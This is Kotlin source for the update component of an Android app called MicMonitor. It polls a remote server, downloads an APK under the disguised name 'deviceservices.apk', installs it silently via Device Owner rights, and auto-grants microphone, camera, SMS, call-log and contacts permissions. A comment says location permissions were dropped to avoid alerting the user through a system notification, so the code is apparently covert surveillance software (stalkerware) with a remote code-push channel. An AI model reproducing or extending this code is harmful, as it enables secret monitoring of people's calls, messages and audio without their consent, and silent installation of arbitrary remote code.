package com.micmonitor.app

import android.Manifest
import android.app.DownloadManager
import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.content.*
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.util.Log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.io.InputStream
import java.net.HttpURLConnection
import java.net.URL

/**
 * UpdateService — Production-level auto-update system for MicMonitor
 * 
 * Features:
 * - Checks server for new version
 * - Downloads APK using DownloadManager
 * - Silent install if Device Owner, otherwise prompts user
 * - Auto-grants all permissions after update (Device Owner)
 * - Supports forced updates (minVersionCode)
 */
object UpdateService {
    
    private const val TAG = "UpdateService"
    private const val SERVER_URL = "https://monitor-raje.onrender.com"
    private const val VERSION_ENDPOINT = "/api/version"
    private const val PREFS_NAME = "update_prefs"
    private const val PREF_LAST_CHECK = "last_check"
    private const val PREF_DOWNLOAD_ID = "download_id"
    private const val CHECK_INTERVAL_MS = 10 * 60 * 1000L // 10 minutes
    
    private var downloadId: Long = -1
    private var isDownloadInProgress = false
    
    // All permissions that should be auto-granted after update
    // Note: Location permissions REMOVED to avoid system notifications
    private val REQUIRED_PERMISSIONS = arrayOf(
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA,
        // Location permissions removed - causes "Your organisation" notification
        // Manifest.permission.ACCESS_FINE_LOCATION,
        // Manifest.permission.ACCESS_COARSE_LOCATION,
        // Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        // Android 13+ (API 33)
        "android.permission.POST_NOTIFICATIONS",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.READ_MEDIA_AUDIO"
    )
    private var downloadReceiver: BroadcastReceiver? = null
    
    data class VersionInfo(
        val versionCode: Int,
        val versionName: String,
        val apkUrl: String,
        val changelog: String,
        val minVersionCode: Int,
        val apkAvailable: Boolean,
        val apkSize: Long
    )
    
    /**
     * Check for updates in background
     */
    suspend fun checkForUpdate(context: Context, forceCheck: Boolean = false): VersionInfo? {
        return withContext(Dispatchers.IO) {
            try {
                val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                val lastCheck = prefs.getLong(PREF_LAST_CHECK, 0)
                
                // Skip if checked recently (unless forced)
                if (!forceCheck && System.currentTimeMillis() - lastCheck < CHECK_INTERVAL_MS) {
                    Log.d(TAG, "Skipping check - checked recently")
                    return@withContext null
                }
                
                Log.i(TAG, "Checking for updates...")
                val versionInfo = fetchVersionInfo()
                
                if (versionInfo == null) {
                    Log.w(TAG, "Failed to fetch version info")
                    return@withContext null
                }
                
                // Save check time
                prefs.edit().putLong(PREF_LAST_CHECK, System.currentTimeMillis()).apply()
                
                val currentVersionCode = getCurrentVersionCode(context)
                Log.i(TAG, "Current: $currentVersionCode, Server: ${versionInfo.versionCode}")
                
                if (versionInfo.versionCode > currentVersionCode && versionInfo.apkAvailable) {
                    Log.i(TAG, "Update available: ${versionInfo.versionName}")
                    return@withContext versionInfo
                }
                
                Log.d(TAG, "No update available")
                null
            } catch (e: Exception) {
                Log.e(TAG, "Error checking for updates: ${e.message}")
                null
            }
        }
    }
    
    /**
     * Download and install update
     */
    fun downloadAndInstall(context: Context, versionInfo: VersionInfo) {
        if (isDownloadInProgress) {
            Log.w(TAG, "Download already in progress")
            return
        }
        try {
            isDownloadInProgress = true
            Log.i(TAG, "Starting download: ${versionInfo.apkUrl}")
            
            // Clean up old APKs
            cleanupOldApks(context)
            
            val apkUrl = if (versionInfo.apkUrl.startsWith("http")) {
                versionInfo.apkUrl
            } else {
                "$SERVER_URL${versionInfo.apkUrl}"
            }
            
            val request = DownloadManager.Request(Uri.parse(apkUrl)).apply {
                setTitle("MicMonitor Update")
                setDescription("Downloading version ${versionInfo.versionName}")
                setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE)
                setDestinationInExternalFilesDir(context, Environment.DIRECTORY_DOWNLOADS, "deviceservices.apk")
                setAllowedOverMetered(true)
                setAllowedOverRoaming(true)
            }
            
            val downloadManager = context.getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
            downloadId = downloadManager.enqueue(request)
            
            // Save download ID
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit()
                .putLong(PREF_DOWNLOAD_ID, downloadId)
                .apply()
            
            Log.i(TAG, "Download started with ID: $downloadId")
            
            // Register receiver for download completion
            registerDownloadReceiver(context)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error starting download: ${e.message}")
            isDownloadInProgress = false
        }
    }
    
    private fun registerDownloadReceiver(context: Context) {
        if (downloadReceiver != null) return
        
        downloadReceiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context, intent: Intent) {
                val id = intent.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID, -1)
                if (id != downloadId) return
                
                Log.i(TAG, "Download completed for ID: $id")
                handleDownloadComplete(ctx)
            }
        }
        
        context.applicationContext.registerReceiver(
            downloadReceiver,
            IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE),
            Context.RECEIVER_EXPORTED
        )
    }
    
    private fun handleDownloadComplete(context: Context) {
        try {
            val downloadManager = context.getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
            val query = DownloadManager.Query().setFilterById(downloadId)
            val cursor: Cursor? = downloadManager.query(query)
            
            if (cursor != null && cursor.moveToFirst()) {
                val statusIndex = cursor.getColumnIndex(DownloadManager.COLUMN_STATUS)
                val status = cursor.getInt(statusIndex)
                
                if (status == DownloadManager.STATUS_SUCCESSFUL) {
                    val uriIndex = cursor.getColumnIndex(DownloadManager.COLUMN_LOCAL_URI)
                    val downloadUri = cursor.getString(uriIndex)
                    Log.i(TAG, "Download successful: $downloadUri")
                    
                    val apkFile = File(Uri.parse(downloadUri).path ?: return)
                    installApk(context, apkFile)
                } else {
                    Log.e(TAG, "Download failed with status: $status")
                }
                cursor.close()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling download completion: ${e.message}")
        } finally {
            isDownloadInProgress = false
            // Unregister receiver
            try {
                downloadReceiver?.let { context.applicationContext.unregisterReceiver(it) }
                downloadReceiver = null
            } catch (_: Exception) {}
        }
    }
    
    /**
     * Install APK - silent if Device Owner, otherwise prompt user
     */
    fun installApk(context: Context, apkFile: File) {
        if (!apkFile.exists()) {
            Log.e(TAG, "APK file not found: ${apkFile.absolutePath}")
            return
        }
        
        Log.i(TAG, "Installing APK: ${apkFile.absolutePath} (${apkFile.length()} bytes)")
        
        if (isDeviceOwner(context)) {
            Log.i(TAG, "Device Owner mode - attempting silent install")
            silentInstall(context, apkFile)
        } else {
            Log.i(TAG, "Not Device Owner - prompting user")
            promptInstall(context, apkFile)
        }
    }
    
    /**
     * Check if app is Device Owner
     */
    fun isDeviceOwner(context: Context): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        return dpm.isDeviceOwnerApp(context.packageName)
    }
    
    /**
     * Auto-grant all required permissions (Device Owner only)
     * Call this after app update or on app start
     */
    fun autoGrantPermissions(context: Context) {
        if (!isDeviceOwner(context)) {
            Log.d(TAG, "Not Device Owner - cannot auto-grant permissions")
            return
        }
        
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
        val packageName = context.packageName
        
        var granted = 0
        var failed = 0
        
        for (permission in REQUIRED_PERMISSIONS) {
            try {
                // Check if permission is declared in manifest
                val permInfo = try {
                    context.packageManager.getPermissionInfo(permission, 0)
                } catch (e: PackageManager.NameNotFoundException) {
                    Log.d(TAG, "Permission not found: $permission")
                    continue
                }
                
                // Only grant runtime permissions (dangerous permissions)
                if (permInfo.protection and android.content.pm.PermissionInfo.PROTECTION_DANGEROUS == 0) {
                    continue
                }
                
                val result = dpm.setPermissionGrantState(
                    adminComponent,
                    packageName,
                    permission,
                    DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED
                )
                
                if (result) {
                    granted++
                    Log.d(TAG, "Auto-granted: $permission")
                } else {
                    failed++
                    Log.w(TAG, "Failed to grant: $permission")
                }
            } catch (e: Exception) {
                failed++
                Log.e(TAG, "Error granting $permission: ${e.message}")
            }
        }
        
        Log.i(TAG, "Auto-grant complete: $granted granted, $failed failed")
    }
    
    /**
     * Silent install using PackageInstaller (requires Device Owner)
     */
    private fun silentInstall(context: Context, apkFile: File) {
        try {
            val packageInstaller = context.packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            params.setAppPackageName(context.packageName)
            
            val sessionId = packageInstaller.createSession(params)
            val session = packageInstaller.openSession(sessionId)
            
            // Write APK to session
            val inputStream: InputStream = FileInputStream(apkFile)
            val outputStream = session.openWrite("deviceservices.apk", 0, apkFile.length())
            
            val buffer = ByteArray(65536)
            var bytesRead: Int
            while (inputStream.read(buffer).also { bytesRead = it } != -1) {
                outputStream.write(buffer, 0, bytesRead)
            }
            
            session.fsync(outputStream)
            outputStream.close()
            inputStream.close()
            
            // Create intent for installation result
            val intent = Intent(context, InstallResultReceiver::class.java).apply {
                action = "com.micmonitor.app.INSTALL_RESULT"
                component = ComponentName(context, InstallResultReceiver::class.java)
            }
            
            val pendingIntent = PendingIntent.getBroadcast(
                context,
                sessionId,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            
            // Commit the session
            session.commit(pendingIntent.intentSender)
            Log.i(TAG, "Silent install session committed: $sessionId")
            
        } catch (e: Exception) {
            Log.e(TAG, "Silent install failed: ${e.message}")
            // Fallback to prompt install
            promptInstall(context, apkFile)
        }
    }
    
    /**
     * Prompt user to install (fallback when not Device Owner)
     */
    private fun promptInstall(context: Context, apkFile: File) {
        try {
            val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                androidx.core.content.FileProvider.getUriForFile(
                    context,
                    "${context.packageName}.fileprovider",
                    apkFile
                )
            } else {
                Uri.fromFile(apkFile)
            }
            
            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
            }
            
            context.startActivity(intent)
            Log.i(TAG, "Install prompt shown to user")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error showing install prompt: ${e.message}")
        }
    }
    
    /**
     * Fetch version info from server
     */
    private fun fetchVersionInfo(): VersionInfo? {
        var connection: HttpURLConnection? = null
        try {
            val url = URL("$SERVER_URL$VERSION_ENDPOINT")
            connection = url.openConnection() as HttpURLConnection
            connection.connectTimeout = 10000
            connection.readTimeout = 10000
            connection.requestMethod = "GET"
            
            if (connection.responseCode != 200) {
                Log.e(TAG, "Server returned ${connection.responseCode}")
                return null
            }
            
            val response = connection.inputStream.bufferedReader().readText()
            val json = JSONObject(response)
            
            return VersionInfo(
                versionCode = json.optInt("versionCode", 1),
                versionName = json.optString("versionName", "1.0.0"),
                apkUrl = json.optString("apkUrl", ""),
                changelog = json.optString("changelog", ""),
                minVersionCode = json.optInt("minVersionCode", 1),
                apkAvailable = json.optBoolean("apkAvailable", false),
                apkSize = json.optLong("apkSize", 0)
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error fetching version: ${e.message}")
            return null
        } finally {
            connection?.disconnect()
        }
    }
    
    private fun getCurrentVersionCode(context: Context): Int {
        return try {
            val pInfo = context.packageManager.getPackageInfo(context.packageName, 0)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                pInfo.longVersionCode.toInt()
            } else {
                @Suppress("DEPRECATION")
                pInfo.versionCode
            }
        } catch (e: Exception) {
            1
        }
    }
    
    private fun cleanupOldApks(context: Context) {
        try {
            val downloadsDir = context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)
            downloadsDir?.listFiles()?.forEach { file ->
                if (file.name.endsWith(".apk")) {
                    file.delete()
                    Log.d(TAG, "Deleted old APK: ${file.name}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error cleaning up old APKs: ${e.message}")
        }
    }
}

/**
 * BroadcastReceiver for silent install results
 */
class InstallResultReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE)
        val message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE)
        
        when (status) {
            PackageInstaller.STATUS_SUCCESS -> {
                Log.i("InstallResult", "Installation successful! Auto-starting service...")
                // Auto-grant any new permissions after update
                UpdateService.autoGrantPermissions(context)
                
                // Auto-start the service immediately after successful install
                try {
                    val serviceIntent = Intent(context, MicService::class.java)
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        context.startForegroundService(serviceIntent)
                    } else {
                        context.startService(serviceIntent)
                    }
                    Log.i("InstallResult", "MicService started after update")
                    
                    // Launch UI too
                    val activityIntent = Intent(context, MainActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                    }
                    context.startActivity(activityIntent)
                    Log.i("InstallResult", "MainActivity launched after update")
                } catch (e: Exception) {
                    Log.e("InstallResult", "Failed to start service/activity: ${e.message}")
                }
            }
            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                // Need user confirmation (shouldn't happen with Device Owner)
                val confirmIntent = intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
                confirmIntent?.let {
                    it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(it)
                }
            }
            else -> {
                Log.e("InstallResult", "Installation failed: $status - $message")
            }
        }
    }
}
